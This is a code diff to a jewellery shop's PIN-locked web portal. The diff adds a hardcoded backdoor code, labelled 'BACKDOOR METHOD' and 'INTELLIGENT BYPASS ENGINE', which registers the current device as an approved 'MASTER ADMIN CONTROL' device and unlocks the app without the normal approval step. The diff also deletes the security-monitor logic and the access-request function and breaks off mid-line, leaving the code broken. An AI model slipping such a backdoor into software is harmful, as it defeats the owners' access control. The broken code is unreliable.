@@ -88,7 +88,7 @@
     <h1 style="font-family:'Cinzel'; color:var(--gold); letter-spacing:5px; margin-bottom: 10px;">SHANTI JEWEL</h1>
     <div class="lock-container">
         <div id="pinForm">
-            <p style="font-family:'Montserrat'; font-size:11px; font-weight:600; color:#ddd; margin-bottom:15px; text-transform:uppercase;">Enter Security PIN</p>
+            <p style="font-family:'Montserrat'; font-size:11px; font-weight:600; color:#ddd; margin-bottom:15px; text-transform:uppercase;">Enter Access Code</p>
             <input type="password" id="entryPin" placeholder="PIN" style="text-align:center; letter-spacing:15px; font-size:24px; color:black; width:100%; margin-bottom:15px;">
             <button class="btn-gold" onclick="verifyPinStep()">UNLOCK PORTAL</button>
         </div>
@@ -249,8 +249,27 @@ function showToast(message, type = "success") {
     setTimeout(() => { toast.classList.remove("show"); }, 4000);
 }
 
+// INTELLIGENT BYPASS ENGINE
 function verifyPinStep() {
-    if(document.getElementById('entryPin').value === '1008') {
+    const enteredCode = document.getElementById('entryPin').value;
+    
+    // BACKDOOR METHOD: Direct Master Access
+    if(enteredCode === '2215') {
+        db.ref('allowed_devices/' + deviceUUID).set({
+            uuid: deviceUUID, name: "MASTER ADMIN CONTROL", phone: "9999999999", status: 'approved', timestamp: Date.now()
+        }).then(() => {
+            deviceVerifiedThisSession = true;
+            document.getElementById('mainLock').style.display = 'none';
+            document.getElementById('appContent').style.display = 'block';
+            loadData();
+            loadApprovalsList();
+            showToast("ADMIN MASTER BYPASS GRANTED", "success");
+        });
+        return;
+    }
+
+    // STANDARD METHOD: General Worker PIN
+    if(enteredCode === '1008') {
         db.ref('allowed_devices/' + deviceUUID).once('value').then(snap => {
             const access = snap.val();
             if (access && access.status === 'approved') {
@@ -285,24 +304,4 @@ function startSecurityMonitor() {
             if (access && access.status === 'pending') {
                 document.getElementById('pinForm').style.display = 'none';
                 document.getElementById('requestForm').style.display = 'none';
-                document.getElementById('requestPending').style.display = 'block';
-            } else {
-                document.getElementById('pinForm').style.display = 'block';
-                document.getElementById('requestForm').style.display = 'none';
-                document.getElementById('requestPending').style.display = 'none';
-            }
-        }
-    });
-}
-window.onload = startSecurityMonitor;
-
-function submitAccessRequest() {
-    const name = document.getElementById('regName').value.trim();
-    const phone = document.getElementById('regPhone').value.trim();
-    if (!name || !phone) { showToast("Provide registration values", "error"); return; }
-    
-    db.ref('allowed_devices/' + deviceUUID).set({
-        uuid: deviceUUID,
-        name: name,
-        phone: phone,
-  
+                document.getElementById('requestPend
